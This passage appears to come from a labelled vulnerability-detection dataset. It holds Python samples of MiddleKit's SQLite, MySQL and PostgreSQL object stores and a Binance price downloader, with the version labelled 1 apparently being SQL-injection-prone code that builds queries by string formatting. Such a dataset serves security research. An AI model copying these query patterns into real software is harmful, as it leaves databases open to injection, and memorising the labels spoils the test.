connectionAndCursor(self, connection=None):\n        \"\"\"Return the connection and cursor needed for executing SQL.\n\n        Takes into account factors such as setting('Threaded') and the\n        threadsafety level of the DB API module. You can pass in a connection to\n        force a particular one to be used. Uses newConnection() and connect().\n        \"\"\"\n        if aggressiveGC:\n            import gc\n            assert gc.isenabled()\n            gc.collect()\n        if connection:\n            conn = connection\n        elif self._threaded:\n            if self._pool:\n                conn = self._pool.connection()\n            elif self._threadSafety == 1:\n                conn = self.newConnection()\n            else:  # safety = 2, 3\n                if not self._connected:\n                    self.connect()\n                conn = self._connection\n        else:\n            # Non-threaded\n            if not self._connected:\n                self.connect()\n            conn = self._connection\n        cursor = conn.cursor()\n        return conn, cursor\n\n    def threadSafety(self):\n        \"\"\"Return the threadsafety of the DB API module.\"\"\"\n        return self.dbapiModule().threadsafety\n\n    def dbapiVersion(self):\n        \"\"\"Return the version of the DB API module.\"\"\"\n        module = self.dbapiModule()\n        return '%s %s' % (module.__name__, module.version)\n\n    def dbVersion(self):\n        \"\"\"Return the database version.\n\n        Subclass responsibility.\n        \"\"\"\n        raise AbstractError(self.__class__)\n\n    def addDeletedToClauses(self, clauses):\n        \"\"\"Modify the given set of clauses so that it filters out records with non-NULL deleted field.\"\"\"\n        clauses = clauses.strip()\n        if clauses.lower().startswith('where'):\n            where = clauses[5:]\n            orderByIndex = where.lower().find('order by')\n            if orderByIndex < 0:\n                orderBy = ''\n            else:\n                where, orderBy = where[:orderByIndex], where[orderByIndex:]\n            return 'where deleted is null and (%s) %s' % (where, orderBy)\n        else:\n            return 'where deleted is null %s' % clauses\n\n\n    ## Obj refs ##\n\n    def fetchObjRef(self, objRef):\n        \"\"\"Fetch referenced object.\n\n        Given an unarchived object reference, this method returns the actual\n        object for it (or None if the reference is NULL or dangling). While\n        this method assumes that obj refs are stored as 64-bit numbers containing\n        the class id and object serial number, subclasses are certainly able to\n        override that assumption by overriding this method.\n        \"\"\"\n        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)\n        if objRef == 0:\n            return None\n        else:\n            klassId, serialNum = objRefSplit(objRef)\n            if klassId == 0 or serialNum == 0:\n                # invalid! we don't use 0 serial numbers\n                return self.objRefZeroSerialNum(objRef)\n\n            klass = self.klassForId(klassId)\n\n            # Check if we already have this in memory first\n            key = ObjectKey()\n            key.initFromClassNameAndSerialNum(klass.name(), serialNum)\n            obj = self._objects.get(key)\n            if obj:\n                return obj\n\n            clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)\n            objs = self.fetchObjectsOfClass(klass, clauses, isDeep=False)\n            if len(objs) == 1:\n                return objs[0]\n            elif len(objs) > 1:\n                # @@ 2000-11-22 ce: expand the msg with more information\n                raise ValueError('Multiple objects.')\n            else:\n                return self.objRefDangles(objRef)\n\n    def objRefInMem(self, objRef):\n        \"\"\"Return referenced object in memory.\n\n        Returns the object corresponding to the given objref if and only if it\n        has been loaded into memory. If the object has never been fetched from\n        the database, None is returned.\n        \"\"\"\n        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)\n        if objRef == 0:\n            return 0\n        else:\n            klassId, serialNum = objRefSplit(objRef)\n            if klassId == 0 or serialNum == 0:\n                # invalid! we don't use 0 serial numbers\n                return self.objRefZeroSerialNum(objRef)\n\n            klass = self.klassForId(klassId)\n\n            # return whether we have this object in memory\n            key = ObjectKey()\n            key.initFromClassNameAndSerialNum(klass.name(), serialNum)\n            return self._objects.get(key)\n\n    def objRefZeroSerialNum(self, objRef):\n        \"\"\"Raise serial number zero error.\n\n        Invoked by fetchObjRef() if either the class or the object serial\n        number is zero.\n        \"\"\"\n        raise ObjRefZeroSerialNumError(objRefSplit(objRef))\n\n    def objRefDangles(self, objRef):\n        \"\"\"Raise dangling reference error.\n\n        Invoked by fetchObjRef() if there is no possible target object\n        for the given objRef.\n\n        E.g., this can happen for a dangling reference. This method invokes\n        self.warning() and includes the objRef as decimal, hexadecimal\n        and class:obj numbers.\n        \"\"\"\n        raise ObjRefDanglesError(objRefSplit(objRef))\n\n\n    ## Special Cases ##\n\n    def filterDateTimeDelta(self, dtd):\n        \"\"\"Adapt DateTimeDeltas.\n\n        Some databases have no TIME type and therefore will not return\n        DateTimeDeltas. This utility method is overridden by subclasses\n        as appropriate and invoked by the test suite.\n        \"\"\"\n        return dtd\n\n    def sqlNowCall(self):\n        \"\"\"Get current DateTime.\"\"\"\n        return 'CURRENT_TIMESTAMP'\n\n\n    ## Self util ##\n\n    def doneWithConnection(self, conn):\n        \"\"\"Invoked by self when a connection is no longer needed.\n\n        The default behavior is to commit and close the connection.\n        \"\"\"\n        if conn is not None:\n            # Starting with 1.2.0, MySQLdb disables autocommit by default,\n            # as required by the DB-API standard (PEP-249). If you are using\n            # InnoDB tables or some other type of transactional table type,\n            # you'll need to do connection.commit() before closing the connection,\n            # or else none of your changes will be written to the database.\n            try:\n                conn.commit()\n            except Exception:\n                pass\n            conn.close()\n\n\n    ## Debugging ##\n\n    def dumpTables(self, out=None):\n        if out is None:\n            out = sys.stdout\n        out.write('DUMPING TABLES\\n')\n        out.write('BEGIN\\n')\n        conn = None\n        try:\n            for klass in self.model().klasses().values():\n                out.write(klass.name() + '\\n')\n                conn, cur = self.executeSQL('select * from %s;'\n                    % klass.name(), conn)\n                out.write(str(self._cursor.fetchall()))\n                out.write('\\n')\n        finally:\n            self.doneWithConnection(conn)\n        out.write('END\\n')\n\n    def dumpKlassIds(self, out=None):\n        if out is None:\n            out = sys.stdout\n        wr = out.write('DUMPING KLASS IDs\\n')\n        for klass in self.model().klasses().values():\n            out.write('%25s %2i\\n' % (klass.name(), klass.id()))\n        out.write('\\n')\n\n    def dumpObjectStore(self, out=None, progress=False):\n        if out is None:\n            out = sys.stdout\n        for klass in self.model().klasses().values():\n            if progress:\n                sys.stderr.write(\".\")\n            out.write('%s objects\\n' % (klass.name()))\n            attrs = [attr for attr in klass.allAttrs() if attr.hasSQLColumn()]\n            colNames = [attr.name() for attr in attrs]\n            colNames.insert(0, klass.sqlSerialColumnName())\n            out.write(CSVJoiner.joinCSVFields(colNames) + \"\\n\")\n\n            # write out a line for each object in this class\n            objlist = self.fetchObjectsOfClass(klass.name(), isDeep=False)\n            for obj in objlist:\n                fields = []\n                fields.append(str(obj.serialNum()))\n                for attr in attrs:\n                    # jdh 2003-03-07: if the attribute is a dangling object reference, the value\n                    # will be None.  This means that dangling references will _not_ be remembered\n                    # across dump/generate/create/insert procedures.\n                    method = getattr(obj, attr.pyGetName())\n                    value = method()\n                    if value is None:\n                        fields.append('')\n                    elif isinstance(value, MiddleObject):\n                        fields.append('%s.%d' % (value.klass().name(),\n                            value.serialNum()))\n                    else:\n                        fields.append(str(value))\n                out.write(CSVJoiner.joinCSVFields(fields).replace('\\r', '\\\\r'))\n\n                out.write('\\n')\n            out.write('\\n')\n        out.write('\\n')\n        if progress:\n            sys.stderr.write(\"\\n\")\n\n\nclass Model(object):\n\n    def sqlDatabaseName(self):\n        \"\"\"Return the name of the database.\n\n        This is either the 'Database' setting or self.name().\n        \"\"\"\n        name = self.setting('Database', None)\n        if name is None:\n            name = self.name()\n        return name\n\n\nclass MiddleObjectMixIn(object):\n\n    def sqlObjRef(self):\n        \"\"\"Return the 64-bit integer value that refers to self in a SQL database.\n\n        This only makes sense if the UseBigIntObjRefColumns setting is True.\n        \"\"\"\n        return objRefJoin(self.klass().id(), self.serialNum())\n\n    def sqlInsertStmt(self, unknowns, id=None):\n        \"\"\"Return SQL insert statements.\n\n        Returns the SQL insert statements for MySQL (as a tuple) in the form:\n            insert into table (name, ...) values (value, ...);\n\n        May add an info object to the unknowns list for obj references that\n        are not yet resolved.\n        \"\"\"\n        klass = self.klass()\n        insertSQLStart, sqlAttrs = klass.insertSQLStart(includeSerialColumn=id)\n        values = []\n        append = values.append\n        extend = values.extend\n        if id is not None:\n            append(str(id))\n        for attr in sqlAttrs:\n            try:\n                value = attr.sqlValue(self.valueForAttr(attr))\n            except UnknownSerialNumberError as exc:\n                exc.info.sourceObject = self\n                unknowns.append(exc.info)\n                if self.store().model().setting('UseBigIntObjRefColumns', False):\n                    value = 'NULL'\n                else:\n                    value = ('NULL', 'NULL')\n            if isinstance(value, basestring):\n                append(value)\n            else:\n                # value could be sequence for attrs requiring multiple SQL columns\n                extend(value)\n        if not values:\n            values = ['0']\n        values = ','.join(values)\n        return insertSQLStart + values + ');'\n\n    def sqlUpdateStmt(self):\n        \"\"\"Return SQL update statement.\n\n        Returns the SQL update statement of the form:\n            update table set name=value, ... where idName=idValue;\n        Installed as a method of MiddleObject.\n        \"\"\"\n        assert self._mk_changedAttrs\n        klass = self.klass()\n        res = []\n        for attr in self._mk_changedAttrs.values():\n            res.append(attr.sqlUpdateExpr(self.valueForAttr(attr)))\n        res = ','.join(res)\n        res = ('update ', klass.sqlTableName(), ' set ', res, ' where ',\n            klass.sqlSerialColumnName(), '=', str(self.serialNum()))\n        return ''.join(res)\n\n    def sqlDeleteStmt(self):\n        \"\"\"Return SQL delete statement.\n\n        Returns the SQL delete statement for MySQL of the form:\n            delete from table where idName=idValue;\n        Or if deletion is being marked with a timestamp:\n            update table set deleted=Now();\n        Installed as a method of MiddleObject.\n        \"\"\"\n        klass = self.klass()\n        assert klass is not None\n        if self.store().model().setting('DeleteBehavior', 'delete') == 'mark':\n            return 'update %s set deleted=%s where %s=%d;' % (\n                klass.sqlTableName(), self.store().sqlNowCall(),\n                klass.sqlSerialColumnName(), self.serialNum())\n        else:\n            return 'delete from %s where %s=%d;' % (klass.sqlTableName(),\n                klass.sqlSerialColumnName(), self.serialNum())\n\n    def referencingObjectsAndAttrsFetchKeywordArgs(self, backObjRefAttr):\n        if self.store().setting('UseBigIntObjRefColumns'):\n            return dict(refreshAttrs=True, clauses='WHERE %s=%s'\n                % (backObjRefAttr.sqlColumnName(), self.sqlObjRef()))\n        else:\n            classIdName, objIdName = backObjRefAttr.sqlColumnNames()\n            return dict(refreshAttrs=True, clauses='WHERE (%s=%s AND %s=%s)'\n                % (classIdName, self.klass().id(), objIdName, self.serialNum()))\n\nMixIn(MiddleObject, MiddleObjectMixIn)\n    # Normally we don't have to invoke MixIn()--it's done automatically.\n    # However, that only works when augmenting MiddleKit.Core classes\n    # (MiddleObject belongs to MiddleKit.Run).\n\n\nimport MiddleKit.Design.KlassSQLSerialColumnName\n\n\nclass Klass(object):\n\n    _fetchSQLStart = None  # help out the caching mechanism in fetchSQLStart()\n    _insertSQLStart = None  # help out the caching mechanism in insertSQLStart()\n\n    def sqlTableName(self):\n        \"\"\"Return the name of the SQL table for this class.\n\n        Returns self.name().\n        Subclasses may wish to override to provide special quoting that\n        prevents name collisions between table names and reserved words.\n        \"\"\"\n        return self.name()\n\n    def fetchSQLStart(self):\n        if self._fetchSQLStart is None:\n            attrs = self.allDataAttrs()\n            attrs = [attr for attr in attrs if attr.hasSQLColumn()]\n            colNames = [self.sqlSerialColumnName()]\n            colNames.extend([attr.sqlColumnName() for attr in attrs])\n            self._fetchSQLStart = 'select %s from %s ' % (','.join(colNames), self.sqlTableName())\n        return self._fetchSQLStart\n\n    def insertSQLStart(self, includeSerialColumn=False):\n        \"\"\"Return a tuple of insertSQLStart (a string) and sqlAttrs (a list).\"\"\"\n        if self._insertSQLStart is None:\n            res = ['insert into %s (' % self.sqlTableName()]\n            attrs = self.allDataAttrs()\n            attrs = [attr for attr in attrs if attr.hasSQLColumn()]\n            fieldNames = [attr.sqlColumnName() for attr in attrs]\n            if includeSerialColumn or len(fieldNames) == 0:\n                fieldNames.insert(0, self.sqlSerialColumnName())\n            res.append(','.join(fieldNames))\n            res.append(') values (')\n            self._insertSQLStart = ''.join(res)\n            self._sqlAttrs = attrs\n        return self._insertSQLStart, self._sqlAttrs\n\n\nclass Attr(object):\n\n    def shouldRegisterChanges(self):\n        \"\"\"Return self.hasSQLColumn().\n\n        This only makes sense since there would be no point in registering\n        changes on an attribute with no corresponding SQL column. The standard\n        example of such an attribute is \"list\".\n        \"\"\"\n        return self.hasSQLColumn()\n\n    def hasSQLColumn(self):\n        \"\"\"Check if there is a correlating SQL column.\n\n        Returns true if the attribute has a direct correlating SQL column in\n        its class' SQL table definition.\n        Most attributes do. Those of type list do not.\n        \"\"\"\n        return not self.get('isDerived', False)\n\n    def sqlColumnName(self):\n        \"\"\"Return the SQL column name corresponding to this attribute-\n\n        This is consisting of self.name() + self.sqlTypeSuffix().\n        \"\"\"\n        if not self._sqlColumnName:\n            self._sqlColumnName = self.name()\n        return self._sqlColumnName\n\n    def sqlValue(self, value):\n        \"\"\"Return SQL for Python value.\n\n        For a given Python value, this returns the correct string for use in a\n        SQL statement. Subclasses will typically *not* override this method,\n        but instead, sqlForNonNone() and on rare occasions, sqlForNone().\n        \"\"\"\n        if value is None:\n            return self.sqlForNone()\n        else:\n            return self.sqlForNonNone(value)\n\n    def sqlForNone(self):\n        return 'NULL'\n\n    def sqlForNonNone(self, value):\n        return repr(value)\n\n    def sqlUpdateExpr(self, value):\n        \"\"\"Return update assignments.\n\n        Returns the assignment portion of an UPDATE statement such as:\n            \"foo='bar'\"\n        Using sqlColumnName() and sqlValue(). Subclasses only need to\n        override this if they have a special need (such as multiple columns,\n        see ObjRefAttr).\n        \"\"\"\n        colName = self.sqlColumnName()\n        return colName + '=' + self.sqlValue(value)\n\n    def readStoreDataRow(self, obj, row, i):\n        \"\"\"By default, an attr reads one data value out of the row.\"\"\"\n        value = row[i]\n        obj.setValueForAttr(self, value)\n        return i + 1\n\n\nclass BasicTypeAttr(object):\n    pass\n\n\nclass IntAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)\n        # it's important to use str() since an int might point\n        # to a long (whose repr() would be suffixed with an 'L')\n\n\nclass LongAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)\n\n\nclass DecimalAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)  # repr() will give Decimal(\"3.4\")\n\n\nclass BoolAttr(object):\n\n    def sqlForNonNone(self, value):\n        return '1' if value else '0'  # MySQL and MS SQL will take 1 and 0 for bools\n\n\nclass ObjRefAttr(object):\n\n    def sqlColumnName(self):\n        if not self._sqlColumnName:\n            if self.setting('UseBigIntObjRefColumns', False):\n                self._sqlColumnName = self.name() + 'Id'  # old way: one 64 bit column\n            else:\n                # new way: 2 int columns for class id and obj id\n                self._sqlColumnName = '%s,%s' % self.sqlColumnNames()\n        return self._sqlColumnName\n\n    def sqlColumnNames(self):\n        if not self._sqlColumnNames:\n            assert not self.setting('UseBigIntObjRefColumns', False)\n            name = self.name()\n            classIdName, objIdName = self.setting('ObjRefSuffixes')\n            classIdName = name + classIdName\n            objIdName = name + objIdName\n            self._sqlColumnNames = (classIdName, objIdName)\n        return self._sqlColumnNames\n\n    def sqlForNone(self):\n        if self.setting('UseBigIntObjRefColumns', False):\n            return 'NULL'\n        else:\n            return 'NULL,NULL'\n\n    def sqlForNonNone(self, value):\n        assert isinstance(value, MiddleObject)\n        if value.serialNum() == 0:\n            info = UnknownSerialNumInfo()\n            info.sourceAttr = self\n            info.targetObject = value\n            raise UnknownSerialNumberError(info)\n        else:\n            if self.setting('UseBigIntObjRefColumns', False):\n                return str(value.sqlObjRef())\n            else:\n                return str(value.klass().id()), str(value.serialNum())\n\n    def sqlUpdateExpr(self, value):\n        \"\"\"Return update assignments.\n\n        Returns the assignment portion of an UPDATE statement such as:\n            \"foo='bar'\"\n        Using sqlColumnName() and sqlValue(). Subclasses only need to\n        override this if they have a special need (such as multiple columns,\n        see ObjRefAttr).\n        \"\"\"\n        if self.setting('UseBigIntObjRefColumns', False):\n            colName = self.sqlColumnName()\n            return colName + '=' + self.sqlValue(value)\n        else:\n            classIdName, objIdName = self.sqlColumnNames()\n            if value is None:\n                classId = objId = 'NULL'\n            else:\n                classId = value.klass().id()\n                objId = value.serialNum()\n            return '%s=%s,%s=%s' % (classIdName, classId, objIdName, objId)\n\n    def readStoreDataRow(self, obj, row, i):\n        # This does *not* get called under the old approach of single obj ref columns.\n        # See MiddleObject.readStoreData.\n        classId, objId = row[i], row[i+1]\n        if objId is None:\n            value = None\n        else:\n            value = objRefJoin(classId, objId)\n            # @@ 2004-20-02 ce ^ that's wasteful to join them just so they can be split later,\n            # but it works well with the legacy code\n        obj.setValueForAttr(self, value)\n        return i + 2\n\n\nclass ListAttr(object):\n\n    def hasSQLColumn(self):\n        return False\n\n    def readStoreDataRow(self, obj, row, i):\n        return i\n\n\nclass AnyDateTimeAttr(object):\n\n    def sqlForNonNone(self, value):\n        # Chop off the milliseconds -- SQL databases seem to dislike that.\n        return \"'%s'\" % str(value).split('.', 1)[0]\n\n\nclass DateAttr(object):\n\n    def sqlForNonNone(self, value):\n        # We often get \"YYYY-MM-DD HH:MM:SS\" from datetime, so we split\n        # on space and take the first value to work around that.\n        # This works fine with Python's date class (does no harm).\n        if not isinstance(value, basestring):\n            value = str(value).split(None, 1)[0]\n        return \"'%s'\" % value\n/n/n/nMiddleKit/Run/SQLiteObjectStore.py/n/nimport sqlite3 as sqlite\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass SQLiteObjectStore(SQLObjectStore):\n    \"\"\"SQLiteObjectStore implements an object store backed by a SQLite database.\n\n    See the SQLite docs or the DB API 2.0 docs for more information:\n      https://docs.python.org/2/library/sqlite3.html\n      https://www.python.org/dev/peps/pep-0249/\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = '%s.db' % self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        return self.dbapiModule().connect(**kwargs)\n\n    def dbapiModule(self):\n        return sqlite\n\n    def dbVersion(self):\n        return \"SQLite %s\" % sqlite.sqlite_version\n\n    def _executeSQL(self, cur, sql, clausesArgs=None):\n        try:\n            cur.execute(sql, clausesArgs)\n        except sqlite.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n        except sqlite.OperationalError as e:\n            if 'database is locked' in str(e):\n                print ('Please consider installing a newer SQLite version'\n                    ' or increasing the timeout.')\n            raise\n\n    def sqlNowCall(self):\n        return \"datetime('now')\"\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        return \"'%s'\" % value.replace(\"'\", \"''\")\n/n/n/n", "label": 0}, {"id": "23414a49db38c1a34097fe5682223b4e8c3518a9", "code": "/MiddleKit/Run/MySQLObjectStore.py/n/nimport new\n\nimport MySQLdb\nfrom MySQLdb import Warning\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass MySQLObjectStore(SQLObjectStore):\n    \"\"\"MySQLObjectStore implements an object store backed by a MySQL database.\n\n    MySQL notes:\n      * MySQL home page: http://www.mysql.com.\n      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27\n      * The platforms developed and tested with include Linux (Mandrake 7.1)\n        and Windows ME.\n      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb\n        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.\n      * Newer versions of MySQLdb have autocommit switched off by default.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n      - autocommit\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n\n    See the MySQLdb docs or the DB API 2.0 docs for more information.\n      http://www.python.org/topics/database/DatabaseAPI-2.0.html\n    \"\"\"\n\n    def __init__(self, **kwargs):\n        self._autocommit = kwargs.pop('autocommit', False)\n        SQLObjectStore.__init__(self, **kwargs)\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('db'):\n            args['db'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        conn = self.dbapiModule().connect(**kwargs)\n        if self._autocommit:\n            # MySQLdb 1.2.0 and later disables autocommit by default\n            try:\n                conn.autocommit(True)\n            except AttributeError:\n                pass\n        return conn\n\n    def connect(self):\n        SQLObjectStore.connect(self)\n        if self._autocommit:\n            # Since our autocommit patch above does not get applied to pooled\n            # connections, we have to monkey-patch the pool connection method\n            try:\n                pool = self._pool\n                connection = pool.connection\n            except AttributeError:\n                pass\n            else:\n                def newConnection(self):\n                    conn = self._normalConnection()\n                    try:\n                        conn.autocommit(True)\n                    except AttributeError:\n                        pass\n                    return conn\n                pool._normalConnection = connection\n                pool._autocommit = self._autocommit\n                pool.connection = new.instancemethod(\n                    newConnection, pool, pool.__class__)\n\n    def retrieveLastInsertId(self, conn, cur):\n        try:\n            # MySQLdb module 1.2.0 and later\n            lastId = conn.insert_id()\n        except AttributeError:\n            # MySQLdb module 1.0.0 and earlier\n            lastId = cur.insert_id()\n        # The above is more efficient than this:\n        # conn, cur = self.executeSQL('select last_insert_id();', conn)\n        # id = cur.fetchone()[0]\n        return lastId\n\n    def dbapiModule(self):\n        return MySQLdb\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except MySQLdb.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def sqlNowCall(self):\n        return 'NOW()'\n\n\n# Mixins\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"MySQL provides a quoting function for string -- this method uses it.\"\"\"\n        return \"'\" + MySQLdb.escape_string(value) + \"'\"\n/n/n/n/MiddleKit/Run/PostgreSQLObjectStore.py/n/n\nconnectionPool = True\ntry:\n    import psycopg2 as dbi  # psycopg2 version 2\n    from psycopg2 import Warning, DatabaseError\n    from psycopg2.extensions import QuotedString\nexcept ImportError:\n    try:\n        import psycopg as dbi  # psycopg version 1\n        from psycopg import Warning, DatabaseError\n        from psycopg.extensions import QuotedString\n    except ImportError:\n        connectionPool = False\n        import pgdb as dbi  # PyGreSQL\n        from pgdb import Warning, DatabaseError\n        def QuotedString(s):\n            return \"'%s'\" % s.replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"''\")\n\nfrom MiscUtils import NoDefault\nfrom MiscUtils.MixIn import MixIn\nfrom MiddleKit.Run.ObjectKey import ObjectKey\nfrom MiddleObject import MiddleObject\n\nfrom SQLObjectStore import SQLObjectStore, UnknownSerialNumberError\n\n\nclass PostgreSQLObjectStore(SQLObjectStore):\n    \"\"\"PostgresObjectStore implements an object store backed by a PostgreSQL database.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        args = self._dbArgs.copy()\n        self.augmentDatabaseArgs(args)\n        return self.dbapiModule().connect(**args)\n\n    if connectionPool:\n\n        # psycopg doesn't seem to work well with DBPool. Besides, it does\n        # its own connection pooling internally, so DBPool is unnecessary.\n\n        def setting(self, name, default=NoDefault):\n            if name == 'SQLConnectionPoolSize':\n                return 0\n            return SQLObjectStore.setting(self, name, default)\n\n        # psycopg doesn't like connections to be closed because of pooling\n\n        def doneWithConnection(self, conn):\n            pass\n\n    def newCursorForConnection(self, conn, dictMode=False):\n        return conn.cursor()\n\n    def retrieveNextInsertId(self, klass):\n        seqname = \"%s_%s_seq\" % (klass.name(), klass.sqlSerialColumnName())\n        conn, curs = self.executeSQL(\"select nextval('%s')\" % seqname)\n        value = curs.fetchone()[0]\n        assert value, \"Didn't get next id value from sequence\"\n        return value\n\n    def dbapiModule(self):\n        return dbi\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def saveChanges(self):\n        conn, cur = self.connectionAndCursor()\n        try:\n            SQLObjectStore.saveChanges(self)\n        except DatabaseError:\n            conn.rollback()\n            raise\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                conn.rollback()\n                raise\n        conn.commit()\n\n    def sqlCaseInsensitiveLike(self, a, b):\n        return \"%s ilike %s\" % (a, b)\n\n    def sqlNowCall(self):\n        return 'now()'\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"psycopg provides a quoting function for string -- use it.\"\"\"\n        return \"%s\" % QuotedString(value)\n\n\nclass BoolAttr(object):\n\n    def sqlForNonNone(self, value):\n        if value:\n            return 'TRUE'\n        else:\n            return 'FALSE'\n/n/n/n/MiddleKit/Run/SQLiteObjectStore.py/n/nimport sqlite3 as sqlite\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass SQLiteObjectStore(SQLObjectStore):\n    \"\"\"SQLiteObjectStore implements an object store backed by a SQLite database.\n\n    See the SQLite docs or the DB API 2.0 docs for more information:\n      https://docs.python.org/2/library/sqlite3.html\n      https://www.python.org/dev/peps/pep-0249/\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = '%s.db' % self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        return self.dbapiModule().connect(**kwargs)\n\n    def dbapiModule(self):\n        return sqlite\n\n    def dbVersion(self):\n        return \"SQLite %s\" % sqlite.sqlite_version\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except sqlite.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n        except sqlite.OperationalError as e:\n            if 'database is locked' in str(e):\n                print ('Please consider installing a newer SQLite version'\n                    ' or increasing the timeout.')\n            raise\n\n    def sqlNowCall(self):\n        return \"datetime('now')\"\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        return \"'%s'\" % value.replace(\"'\", \"''\")\n/n/n/n", "label": 1}, {"id": "3f5079f53d8f259474885ff078bf96fdc08e02bd", "code": "get_historical_data.py/n/n# LOAD LIBRARIES & FILES\n\n# load libraries\nfrom binance.client import Client\nimport configparser\nimport sqlite3\n\n\n# load functions\ndef getlist(option, sep=',', chars=None):\n    \"\"\"Return a list from a ConfigParser option. By default,\n       split on a comma and strip whitespaces.\"\"\"\n    return [ chunk.strip(chars) for chunk in option.split(sep) ]\n\n\n# READ FILES\n\n# read credentials\nconfigParser = configparser.ConfigParser()\nconfigParser.read(r'credentials/API-key')\n\napi_key = configParser.get('credentials', 'api_key')\napi_sec = configParser.get('credentials', 'api_secret')\n\n\n# read config\nconfigParser.read(r'config.txt')\n\ndb_path = configParser.get('config', 'db_path')\nverbose = configParser.get('config', 'verbose')\nsymbols = getlist(configParser.get('symbols', 'symbol_list'))\nintervals = getlist(configParser.get('intervals', 'interval_list'))\ntime_start = configParser.get('time', 'time_start')\ntime_end = configParser.get('time', 'time_end')\n\n\n# create timestamps for beginning and now\nif time_start == 'beginning':\n    time_start = 'January 1, 2000'\n\n\n# SET UP DATABASE CONNECTION AND BINANCE CLIENT\n\n# connect to database\ndb_con = sqlite3.connect(db_path)\n\n# cet up binance client\nclient = Client(api_key, api_sec)\n\n\n# GET DATA FOR ALL SYMBOLS AND INTERVALS\n\n# Loop over every symbol and every interval. Download historical data for each combination from binance.com which is not\n# already in the database and write it to the database\nfor symbol in symbols:\n    for interval in intervals:\n\n        # check if table already exists\n        with db_con:\n            cur = db_con.cursor()\n            cur.execute(\"SELECT name FROM sqlite_master WHERE type='table' AND name='{}_{}'\".format(symbol, interval))\n            if cur.fetchone() is None:\n                table_exists = False\n            else:\n                table_exists = True\n\n        # if table does not exist yet, create it and download all historical data.\n        # Note: the SQL-command 'IF NOT EXISTS' has no use here since get_historical_klines()\n        # cannot be used to update existing data\n        if not table_exists:\n            # create table\n            with db_con:\n                cur = db_con.cursor()\n                cur.execute('CREATE TABLE IF NOT EXISTS {}_{}('.format(symbol, interval) +\n                            't_open DATETIME, ' +\n                            'open FLOAT, ' +\n                            'high FLOAT, ' +\n                            'low FLOAT, ' +\n                            'close FLOAT, ' +\n                            'vol FLOAT, ' +\n                            't_close DATETIME, ' +\n                            'u_vol FLOAT, ' +\n                            'no_trds INT, ' +\n                            'tbBav FLOAT, ' +\n                            'tbQav FLOAT)')\n\n            # download data\n            output = client.get_historical_klines(symbol=symbol,\n                                                  interval=interval,\n                                                  start_str=time_start,\n                                                  end_str=time_end)\n\n            # write downloaded data to database\n            with db_con:\n                cur = db_con.cursor()\n                for x in range(0, len(output)):\n                    db_row = (output[x][0],\n                              output[x][1],\n                              output[x][2],\n                              output[x][3],\n                              output[x][4],\n                              output[x][5],\n                              output[x][6],\n                              output[x][7],\n                              output[x][8],\n                              output[x][9],\n                              output[x][10])\n\n                    cur.execute('INSERT INTO {}_{} VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'.format(symbol, interval),\n                                db_row)\n\n            # print process to console if verbose mode is enabled\n            if verbose:\n                print('Symbol {}, interval {}: Historical data has been downloaded '\n                      'and saved to database'.format(symbol, interval))\n\n        # if table already exists and verbose mode is enabled print that to console\n        elif table_exists & (verbose == 'True'):\n            print('Symbol {}, interval {}: Table already exists in database. '\n                  'No data has been downloaded.'.format(symbol, interval))\n/n/n/n", "label": 0}, {"id": "3f5079f53d8f259474885ff078bf96fdc08e02bd", "code": "/get_historical_data.py/n/n# LOAD LIBRARIES & FILES\n\n# load libraries\nfrom binance.client import Client\nimport configparser\nimport sqlite3\n\n\n# load functions\ndef getlist(option, sep=',', chars=None):\n    \"\"\"Return a list from a ConfigParser option. By default,\n       split on a comma and strip whitespaces.\"\"\"\n    return [ chunk.strip(chars) for chunk in option.split(sep) ]\n\n\n# READ FILES\n\n# read credentials\nconfigParser = 